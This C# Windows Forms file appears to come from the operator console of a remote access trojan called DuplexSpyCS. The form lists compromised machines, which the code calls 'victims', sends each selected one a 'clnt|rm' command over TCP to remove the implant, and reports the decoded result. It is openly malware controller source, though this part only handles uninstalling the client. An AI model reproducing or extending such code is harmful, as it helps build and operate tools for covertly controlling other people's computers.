using NAudio.Dmo;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmClntRemove : Form
    {
        public List<clsVictim> m_lsVictim;
        public Form1 frmMain;

        public frmClntRemove()
        {
            InitializeComponent();
        }

        void Received(clsTcpListener listener, clsVictim v, string[] cmd)
        {
            if (cmd[0] == "clnt") //Client
            {
                if (cmd[1] == "rm") //Remove
                {
                    Invoke(new Action(() =>
                    {
                        int nCode = int.Parse(cmd[2]);
                        string szMsg = clsCrypto.b64D2Str(cmd[3]);
                        ListViewItem item = listView1.FindItemWithText(v.ID);
                        item.SubItems[1].Text = nCode == 1 ? "OK" : szMsg;
                    }));
                }
            }
        }

        void setup()
        {
            if (m_lsVictim == null)
            {
                MessageBox.Show("m_lsVictim is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
                return;
            }

            foreach (clsVictim v in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(v.ID);
                item.SubItems.Add("?");
                item.Tag = v;

                listView1.Items.Add(item);
            }

            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
        }

        private void frmClntRemove_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Check All
        private void button1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck All
        private void button2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }
        //GO
        private void button3_Click(object sender, EventArgs e)
        {
            int nThd = (int)numericUpDown1.Value;
            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(nThd, nThd);
            foreach (ListViewItem item in listView1.CheckedItems)
            {
                clsVictim v = (clsVictim)item.Tag;
                ThreadPool.QueueUserWorkItem(x =>
                {
                    v.SendCommand("clnt|rm");
                });
            }
        }
    }
}
